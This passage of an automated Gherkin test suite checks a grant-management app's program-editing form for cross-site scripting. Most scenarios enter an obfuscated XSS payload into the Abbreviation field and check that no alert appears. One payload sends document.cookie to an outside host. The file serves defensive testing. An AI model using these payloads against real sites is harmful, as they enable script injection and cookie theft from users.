      | <script>{onerror=alert}throw 1</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300899 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                  | Field                |
      | <script>throw onerror=alert,1</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300900 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                 | Field                |
      | <script>throw onerror=eval,'=alert\x281\x29'</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300904 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                | Field                |
      | <script>throw onerror=eval,'alert\x281\x29'</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300906 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                 | Field                |
      | <script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300911 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                        | Field                |
      | <script>throw onerror=eval,e=new Error,e.message='alert\x281\x29',e</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300912 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                     | Field                |
      | <script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,!!window.InstallTrigger?e:e.message</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300913 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                             | Field                |
      | <script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300914 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                    | Field                |
      | <script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300915 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                  | Field                |
      | <script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300919 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                     | Field                |
      | <script>'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300923 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                 | Field                |
      | <script>location='javascript:alert\x281\x29'</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300928 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                          | Field                |
      | <script>location=name</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300931 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                     | Field                |
      | <script>alert`1`</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300932 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                               | Field                |
      | <script>new Function`X${document.location.hash.substr`1`}`</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300934 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                             | Field                |
      | <script>Function`X${document.location.hash.substr`1`}```</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300938 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                     | Field                |
      | <video><source onerror=location=/\02.rs/+document.cookie> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300945 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
